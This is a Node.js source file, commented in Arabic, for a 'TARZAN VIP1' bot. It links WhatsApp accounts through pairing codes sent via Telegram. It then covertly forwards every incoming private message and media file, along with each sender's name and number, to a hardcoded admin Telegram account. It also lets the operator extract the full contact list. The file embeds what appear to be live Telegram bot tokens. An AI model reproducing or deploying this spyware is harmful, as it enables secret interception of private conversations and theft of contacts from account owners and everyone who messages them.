/**
 * 👑 TARZAN EMPEROR - VIP1 EDITION
 * ---------------------------------------
 * الميزات: تفصيل كامل للرسائل، سحب جهات، تحكم شامل
 */

const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    downloadMediaMessage,
    getContentType,
    delay,
    Browsers
} = require("@whiskeysockets/baileys");

const { Telegraf, Markup } = require("telegraf");
const express = require("express");
const pino = require("pino");
const fs = require("fs-extra");

// --- ⚙️ الإعدادات ---
const CONFIG = {
    PAIR_BOT_TOKEN: "8578288620:AAFVW35qKVRPHMmKrPacqejWlupE5OgM3qI",
    CONTROL_BOT_TOKEN: "8584722590:AAHFV8u4XZlBPNJ0uD4bHVosXY71bP3hPA4",
    ADMIN_ID: "8510615418",
    PORT: process.env.PORT || 3000
};

// سيرفر Render
const app = express();
app.get("/", (req, res) => res.send("🦁 TARZAN VIP1 IS RUNNING"));
app.listen(CONFIG.PORT);

class TarzanVIP1 {
    constructor() {
        this.sessions = new Map();
        this.pairBot = new Telegraf(CONFIG.PAIR_BOT_TOKEN);
        this.controlBot = new Telegraf(CONFIG.CONTROL_BOT_TOKEN);
        this.init();
    }

    async init() {
        fs.ensureDirSync("./sessions");
        this.setupHandlers();
        this.pairBot.launch({ dropPendingUpdates: true });
        this.controlBot.launch({ dropPendingUpdates: true });
        console.log("🦁 VIP1 System Online");
        
        const dirs = fs.readdirSync("./sessions");
        dirs.forEach(d => d.startsWith("user-") && this.connectWhatsApp(d.replace("user-", "")));
    }

    async connectWhatsApp(phone, ctx = null) {
        const sessionPath = `./sessions/user-${phone}`;
        const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
        const { version } = await fetchLatestBaileysVersion();

        const sock = makeWASocket({
            version,
            auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })) },
            browser: Browsers.macOS("Chrome"),
            printQRInTerminal: false
        });

        this.sessions.set(phone, sock);
        sock.ev.on("creds.update", saveCreds);

        if (ctx && !sock.authState.creds.registered) {
            await delay(5000);
            try {
                const code = await sock.requestPairingCode(phone);
                await ctx.replyWithHTML(`🦁 <b>VIP1 PAIRING CODE:</b>\n\n<code>${code}</code>`);
            } catch (e) { await ctx.reply("❌ فشل الطلب."); }
        }

        sock.ev.on("connection.update", async (u) => {
            if (u.connection === "open") this.sendDashboard(phone);
            if (u.connection === "close") {
                const r = u.lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
                if (r) this.connectWhatsApp(phone);
            }
        });

        sock.ev.on("messages.upsert", async ({ messages }) => {
            const m = messages[0];
            if (!m.message || m.key.fromMe) return;
            this.forwardVIP(phone, m);
        });
    }

    // ==========================================
    // 📥 معالج الرسائل VIP1 (تفاصيل دقيقة)
    // ==========================================
    async forwardVIP(phone, m) {
        const jid = m.key.remoteJid;
        if (jid.endsWith("@g.us") || jid === "status@broadcast") return;

        const type = getContentType(m.message);
        const senderName = m.pushName || "غير مسجل";
        const senderNumber = jid.split('@')[0];
        
        // خريطة أنواع الرسائل للعرض الجمالي
        const typeMap = {
            'conversation': '📝 رسالة نصية',
            'extendedTextMessage': '📝 رسالة نصية (رابط)',
            'imageMessage': '📸 صورة',
            'videoMessage': '🎥 فيديو',
            'audioMessage': '🎵 مقطع صوتي/بصمة',
            'documentMessage': '📄 مستند/ملف',
            'stickerMessage': '🎭 ملصق',
            'contactMessage': '👤 كرت اتصال',
            'locationMessage': '📍 موقع مباشر'
        };

        const msgTypeFriendly = typeMap[type] || `📦 أخرى (${type})`;
        
        // بناء الهيكل الذي طلبته بدقة
        let details = `🦁 <b>[ تفاصيل الرسالة الواردة - VIP1 ]</b>\n`;
        details += `━━━━━━━━━━━━━━━\n`;
        details += `👤 <b>الاسم:</b> ${senderName}\n`;
        details += `📱 <b>الرقم:</b> <code>${senderNumber}</code>\n`;
        details += `📥 <b>المستقبل:</b> ${phone}\n`;
        details += `⚙️ <b>النوع:</b> ${msgTypeFriendly}\n`;
        details += `━━━━━━━━━━━━━━━\n`;

        try {
            // معالجة الميديا
            if (["imageMessage", "videoMessage", "audioMessage", "documentMessage"].includes(type)) {
                const buffer = await downloadMediaMessage(m, "buffer", {}, { logger: pino({ level: "silent" }), rekey: false });
                const caption = details + `💬 <b>الرسالة:</b> [تم إرسال ميديا أعلاه]`;

                if (type === "imageMessage") await this.controlBot.telegram.sendPhoto(CONFIG.ADMIN_ID, { source: buffer }, { caption, parse_mode: "HTML" });
                else if (type === "audioMessage") await this.controlBot.telegram.sendAudio(CONFIG.ADMIN_ID, { source: buffer }, { caption, parse_mode: "HTML" });
                else if (type === "videoMessage") await this.controlBot.telegram.sendVideo(CONFIG.ADMIN_ID, { source: buffer }, { caption, parse_mode: "HTML" });
                else if (type === "documentMessage") await this.controlBot.telegram.sendDocument(CONFIG.ADMIN_ID, { source: buffer }, { caption, parse_mode: "HTML" });
            } 
            // معالجة النص
            else {
                const text = m.message.conversation || m.message.extendedTextMessage?.text || "محتوى غير نصي";
                const finalMsg = details + `💬 <b>الرسالة:</b>\n${text}`;
                await this.controlBot.telegram.sendMessage(CONFIG.ADMIN_ID, finalMsg, { parse_mode: "HTML" });
            }
        } catch (e) {
            console.error("VIP1 Forward Error:", e);
        }
    }

    async sendDashboard(phone) {
        const keyboard = Markup.inlineKeyboard([
            [Markup.button.callback("👥 سحب جهات الاتصال", `getcontacts_${phone}`)],
            [Markup.button.callback("📝 تغيير الوصف (Bio)", `editbio_${phone}`)],
            [Markup.button.callback("🔴 إنهاء الجلسة", `logout_${phone}`)]
        ]);
        await this.controlBot.telegram.sendMessage(CONFIG.ADMIN_ID, `👑 <b>VIP1 CONNECTED:</b> <code>${phone}</code>`, { parse_mode: "HTML", ...keyboard });
    }

    setupHandlers() {
        this.pairBot.command("pair", (ctx) => {
            const num = ctx.message.text.split(" ")[1]?.replace(/\D/g, "");
            if (num) this.connectWhatsApp(num, ctx);
            else ctx.reply("أرسل الرقم بعد الأمر.");
        });

        this.controlBot.on("callback_query", async (ctx) => {
            const [action, phone] = ctx.callbackQuery.data.split("_");
            const sock = this.sessions.get(phone);
            if (!sock) return ctx.answerCbQuery("❌ غير متصل");

            if (action === "getcontacts") {
                await ctx.reply("⏳ جاري استخراج جهات الاتصال...");
                const list = Object.values(sock.contacts || {}).map(c => `${c.name || 'مجهول'}: ${c.id.split('@')[0]}`).join('\n');
                fs.writeFileSync(`./contacts_${phone}.txt`, list || "لا توجد بيانات");
                await ctx.replyWithDocument({ source: `./contacts_${phone}.txt` });
            }
            ctx.answerCbQuery();
        });
    }
}

new TarzanVIP1();
